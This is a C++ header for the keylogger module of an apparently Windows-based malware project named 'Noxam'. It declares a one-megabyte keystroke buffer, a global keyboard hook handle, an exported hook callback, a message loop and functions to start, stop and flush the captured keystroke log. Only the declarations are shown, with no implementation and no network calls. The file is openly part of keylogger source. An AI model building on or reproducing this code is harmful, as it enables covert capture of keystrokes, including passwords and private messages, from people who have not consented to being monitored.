#ifndef NOXAM_NOXAMKEYLOGGER_HXX
#define NOXAM_NOXAMKEYLOGGER_HXX

#define NOXAM_KEYLOG_BUFFER_SIZE (1024 * 1024 * 1)


std::mutex m;

char* NxmKeyLogBuffer = 0;
int I = 0;
bool NxmIsLogging = false;
bool NxmShiftModifier = false;

HHOOK NxmKeyHook;

char* NoxamFLushKeyLoggBuffer(int* NxmLength);
char NoxamEasyToLower(char NxmIn);

bool NoxamStartLogger();
bool NoxamStopLogger();
bool NoxamIsKeyLogging();

__declspec(NxmDllExport) LRESULT NxmCallBack NxmKeyEvent(int NxmCode, WPARAM NxmWParam, LPARAM NxmLParam);
DWORD WINAPI NoxamStartLoggerInvoker(LPVOID NxmIPParameter);

void NoxamMsgLoop();
void NoxamWriteLog(char* NxmKey, int NxmLength);
void NoxamFreeFlushKeyLogBufferResult(char* NxmData);




#endif NOXAM_NOXAMKEYLOGGER_HXX
